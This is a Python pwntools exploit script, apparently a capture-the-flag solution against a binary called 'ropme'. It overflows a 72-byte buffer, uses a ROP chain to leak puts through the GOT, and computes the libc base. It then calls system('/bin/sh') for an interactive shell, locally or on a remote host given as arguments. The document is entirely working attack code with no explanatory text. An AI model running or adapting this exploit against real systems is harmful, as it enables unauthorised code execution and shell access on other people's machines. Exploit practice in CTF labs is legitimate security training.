#!/usr/bin/python3

from pwn import *

global elf


def start():

    global elf

    file_name = './ropme'
    elf = context.binary = ELF(file_name)
    context.log_level = 'debug'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            pwndbg-init
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process(file_name)


def send_payload():

    pop_rdi = p64(0x4006d3)
    fgets_plt = p64(0x00601028)
    puts_plt = p64(0x00601018)
    main_plt = p64(0x00601020)
    puts = p64(0x004004e0)
    main = p64(0x00400626)
    fflush_plt = p64(0x00601030)

    payload = b'a' * 72 + pop_rdi + puts_plt + puts + main
    return payload

def runmain():

    io = start()
    # input('IDA>')
    io.sendlineafter('dah?\n', send_payload())

    leaked_address = u64(io.recvline().strip().ljust(8, b'\x00'))
    print(f'leaked_address: {hex(leaked_address)}')

    puts_offset = 0x06f690
    system_offset = 0x45390
    bin_sh_offset = 0x18cd17
    libc_base = leaked_address - puts_offset
    system_addr = p64(libc_base + system_offset)
    bin_sh_addr = p64(libc_base + bin_sh_offset)
    
    pop_rdi = p64(0x4006d3)
    payload = b'a' * 72 + pop_rdi + bin_sh_addr + system_addr
    io.sendlineafter('dah?\n', payload)

    io.interactive()

if __name__ == '__main__':
    runmain()